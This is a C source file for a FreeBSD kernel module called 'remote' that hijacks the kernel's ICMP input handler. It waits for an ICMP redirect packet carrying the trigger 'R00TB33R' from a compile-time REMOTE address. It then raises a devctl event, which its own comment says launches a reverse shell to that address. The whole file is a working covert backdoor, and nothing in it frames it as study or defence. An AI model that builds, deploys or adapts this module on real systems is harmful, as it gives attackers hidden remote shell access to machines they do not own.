#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/mbuf.h>
#include <sys/protosw.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip_var.h>
#include <sys/devctl.h>
#define TRIGGER "R00TB33R"
#define TRIGGER_LEN 8
#define ARG_LEN 16

extern ipproto_input_t *ip_protox[IPPROTO_MAX];

/* icmp_input hook. */
static int icmp_input_hook(struct mbuf **mp, int *offp, int proto) {
    struct mbuf *m = *mp;
    struct icmp *icp;
    struct ip * ip;
    struct in_addr src;
    char src_buf[INET_ADDRSTRLEN];
    char arg_buf[ARG_LEN];
    int hlen = *offp;

    printf("icmp hook called\n");

    /* Locate the ICMP message within m. */
    m->m_len -= hlen;
    m->m_data += hlen;

    /* Extract the ICMP message. */
    icp = mtod(m, struct icmp *);

    /* Restore m. */
    m->m_len += hlen;
    m->m_data -= hlen;

    printf("icmp_type: %d\n", icp->icmp_type);
    printf("icmp_code: %d\n", icp->icmp_code);
    printf("icmp_data: %.8s\n", icp->icmp_data);
    /* Is this the ICMP message we are looking for? */
    if (icp->icmp_type == ICMP_REDIRECT &&
        icp->icmp_code == ICMP_REDIRECT_TOSHOST &&
        strncmp(icp->icmp_data, TRIGGER, TRIGGER_LEN) == 0) {
        printf("Found right packet\n");

        /* Extract source ip address and create argument */
        ip = mtod(m, struct ip *);
        src = ip->ip_src;
        inet_ntoa_r(src, src_buf);

        /*
         * Check if source ip address match REMOTE which will be define
         * at compile time by the install script
        */
        if (strncmp(src_buf, REMOTE, sizeof(src_buf)) == 0) {
            printf("Sending devd notify\n");
            snprintf(arg_buf, sizeof(arg_buf), "ip=%s", src_buf);
            /* Create devctl event that will create our reverse shell */
            devctl_notify("DHCLIENT", "WORKER", "START", arg_buf);
        }
    } else {
        return(icmp_input(mp, offp, proto));
    }
    return(IPPROTO_DONE);
}

/* The function called at load/unload. */
static int load(struct module *module, int cmd, void *arg) {
    int error = 0;
    switch (cmd) {
        case MOD_LOAD:
        /*
         * NOTE: load and unload may create race condition.
         * The api does not expose a lock that we can use. 
        */
        ip_protox[IPPROTO_ICMP] = icmp_input_hook;
        break;
    case MOD_UNLOAD:
        ip_protox[IPPROTO_ICMP] = icmp_input;
        break;
    default:
        error = EOPNOTSUPP;
        break;
    }
    return(error);
}
static moduledata_t remote = {
    "remote",/* module name */
    load,/* event handler */
    NULL/* extra data */
};

DECLARE_MODULE(remote, remote, SI_SUB_DRIVERS,
SI_ORDER_MIDDLE);
